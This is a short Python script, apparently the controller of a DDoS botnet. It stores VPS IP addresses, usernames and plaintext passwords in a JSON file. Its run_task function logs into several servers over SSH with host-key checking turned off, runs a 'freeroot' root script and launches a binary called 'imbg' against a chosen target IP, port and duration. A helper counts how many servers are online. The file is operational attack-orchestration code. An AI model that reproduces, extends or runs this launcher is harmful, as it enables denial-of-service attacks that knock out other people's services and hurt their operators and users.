import paramiko, threading, socket, json

VPS_FILE = "vps_list.json"

def load_vps():
    try:
        with open(VPS_FILE) as f:
            return json.load(f)
    except:
        return []

def save_vps(data):
    with open(VPS_FILE, "w") as f:
        json.dump(data, f)

def add_vps(ip, user, pw):
    vps = load_vps()
    vps.append({"ip": ip, "user": user, "pass": pw})
    save_vps(vps)

def remove_vps(ip):
    vps = load_vps()
    save_vps([v for v in vps if v["ip"] != ip])

def task_thread(v, cmd):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(v["ip"], username=v["user"], password=v["pass"], timeout=5)
        ssh.exec_command(f"cd freeroot && ./root.sh && cd M && {cmd}")
        ssh.close()
    except:
        pass

def run_task(ip, port, dur):
    vps = load_vps()[:5]
    cmd = f"./imbg {ip} {port} {dur} 25"
    for v in vps:
        threading.Thread(target=task_thread, args=(v, cmd)).start()
    return len(vps)

def get_vps_status():
    vps = load_vps()
    total = len(vps)
    online = 0
    for v in vps:
        try:
            s = socket.create_connection((v["ip"], 22), timeout=1)
            online += 1
            s.close()
        except:
            pass
    return f"📡 VPS Status:\nTotal: {total}\n🟢 Online: {online}\n🔴 Offline: {total - online}"
